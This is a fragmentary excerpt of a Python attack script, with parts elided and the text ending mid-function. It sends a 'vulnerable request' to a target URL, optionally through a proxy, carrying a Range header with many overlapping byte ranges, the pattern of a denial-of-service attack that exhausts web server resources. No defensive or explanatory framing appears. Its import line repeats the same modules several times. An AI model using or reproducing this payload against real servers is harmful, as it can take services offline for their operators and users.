...
import optparse, os, re, socket, threading, time, urllib.request, urllib.parse, urllib.error, urllib.request, urllib.error, urllib.parse, urllib.parse
...
def attack(url, user_agent=None, method='GET', proxy=None):
    ...
    if proxy and not re.match(r'^http(s)?://[^:]+:[0-9]+/?$', proxy, re.I):
        print("(x) Invalid proxy address used")
        exit(-1)

    proxy_support = urllib.request.ProxyHandler({'http': proxy} if proxy else {})
    opener = urllib.request.build_opener(proxy_support)
    urllib.request.install_opener(opener)

    class _MethodRequest(urllib.request.Request): # Create any HTTP (e.g. HEAD/PUT/DELETE) request type with urllib2
    ...
    def _send(check=False): #Send the vulnerable request to the target
        ...
        payload = "bytes=0-,%s" % ",".join("5-%d" % item for item in range(1, RANGE_NUMBER))
        try:
